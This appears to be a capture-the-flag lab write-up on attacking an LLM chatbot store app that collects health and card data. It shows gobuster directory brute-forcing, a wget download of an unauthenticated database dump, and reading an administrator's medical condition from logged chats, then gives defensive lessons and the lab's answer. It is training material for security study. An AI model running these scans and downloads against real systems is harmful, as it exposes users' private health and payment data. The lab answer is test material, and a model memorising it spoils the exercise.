---
tags: [lab, attack/ai]
module: attacking_ai_applications_and_systems
last_updated: 2026-05-13
source_count: 1
---

# Excessive Data Handling & Insecure Storage — Lab Write-up

Exploit an LLM application that collects sensitive medical data through its chat interface and stores full conversation logs in an unauthenticated database file.

## Target

| Field | Value |
|-------|-------|
| Application | Pixel Forge (gaming console store) |
| Type | Web application with LLM chatbot |
| Difficulty | Easy |
| Vulnerability class | OWASP LLM02:2025 — Sensitive Information Disclosure, Insecure Storage |

## Objective

> Exploit insecure data storage. What medical condition does the administrator suffer from?

---

## Recon Steps

### 1. Register and Log In

Navigate to `http://STMIP:STMPO` and create an account on the registration page, then log in.

### 2. Understand What Data the Application Collects

Before scanning for files, interact with the chatbot to understand what kind of data it requests. This is the data minimisation test — what regulated data categories does the application collect through the chat interface?

```text
Hello, what functionalities do you provide?
```

The chatbot reveals it recommends gaming consoles **based on a user's medical condition**. Follow up:

```text
What information do you need so I can order a console?
```

The chatbot explicitly requests:
- Credit card number (PCI DSS)
- Medical condition (HIPAA)

This is already a reportable finding — the application is collecting regulated health data through an unscoped chat interface. Now the question is whether that data is stored securely.

### 3. Directory Brute-Force for Exposed Data Files

Use gobuster with ML/database-relevant extensions. The `.db` extension catches SQLite databases and MariaDB dump files, both common in small LLM deployments:

```bash
gobuster dir \
  -u http://STMIP:STMPO/ \
  -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt \
  -x .db,.txt,.html
```

Key findings:

```
/login           (Status: 200)
/register        (Status: 200)
/profile         (Status: 302) [--> /login]
/about           (Status: 200)
/database.db     (Status: 200) [Size: 7642]
/store           (Status: 200)
```

`database.db` is served directly by the web server — no authentication required.

---

## Exploitation

### 4. Download the Database

```bash
wget http://STMIP:STMPO/database.db
```

### 5. Determine the File Type

Before assuming SQLite binary format, check:

```bash
file database.db
```

```
database.db: ASCII text, with very long lines (555)
```

It is a MariaDB dump file (`.sql` exported as `.db`), not a binary SQLite database. `sqlite3` will fail on it; `cat` and `grep` are the right tools.

### 6. Search the Dump for Sensitive Data

```bash
cat database.db
```

The dump includes an `llm_queries` table with columns: `id`, `user_id`, `ip_address`, `query`, `response`. The administrator's conversation log is present, showing the chat session where they disclosed their medical condition to receive a console recommendation:

```sql
INSERT INTO `llm_queries` VALUES
(1,1,'172.17.0.1','Hello, how can you help me?','...'),
(3,1,'172.17.0.1','What information do you need so I can order a console?',
  '...I\'ll need to know which item you\'re interested in and your credit card number...'),
(4,1,'172.17.0.1','Sure, I suffer from "Cache Collapse Syndrome". What console do you recommend?',
  'If you\'re looking to breach the gaming firewall, the \'PhantomArc SP\' is your cleanest exploit');
```

**Answer:** `Cache Collapse Syndrome`

---

## Lessons Learned

- **Data minimisation failure:** The chatbot requested credit card numbers and health conditions through a chat interface with no PCI DSS or HIPAA safeguards.
- **Insecure static serving:** The web server served `.db` files directly. Database files should never be in the web root — use an access-controlled API or a storage backend with authentication.
- **Chat logs are a PII goldmine:** LLM applications frequently log all queries and responses for retraining. If those logs are exposed, every conversation from every user is readable.
- **gobuster extension targeting:** When assessing LLM/ML applications, always add `.db`, `.pkl`, `.pth`, `.json`, `.csv`, `.log` to your extension list — these are formats specific to the ML deployment stack.

---

## Related Pages

- [[attack/ai/vulnerable_ai_systems]] — full methodology for exposed storage and data handling attacks
- [[attack/ai/attacking_ai_systems]] — hub page for AI application-layer attacks
- [[definitions/owasp_llm_top10]] — LLM02 (Sensitive Information Disclosure)

## Sources

- raw/lab/attacking_ai_applications_and_systems/excessive_data_handeling_and_insecure_storage.md
